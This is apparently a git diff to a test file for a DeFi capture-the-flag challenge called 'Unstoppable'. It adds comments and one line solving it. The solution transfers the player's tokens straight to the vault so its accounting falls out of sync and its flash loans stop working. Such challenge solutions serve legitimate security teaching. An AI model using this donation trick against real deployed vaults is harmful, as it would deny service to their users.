@@ -43,7 +43,13 @@ describe('[Challenge] Unstoppable', function () {
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
+    //When using address(this).balance or balanceOf(address(this)),
+    //you must account for the possibility of "donations"
+    //that bypass the deposit and withdraw functions.
+    //Exploit - now totalAssets() is not at sync with loan totalSupply.
+
     it('Execution', async function () {
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
         /** CODE YOUR SOLUTION HERE */
     });
 
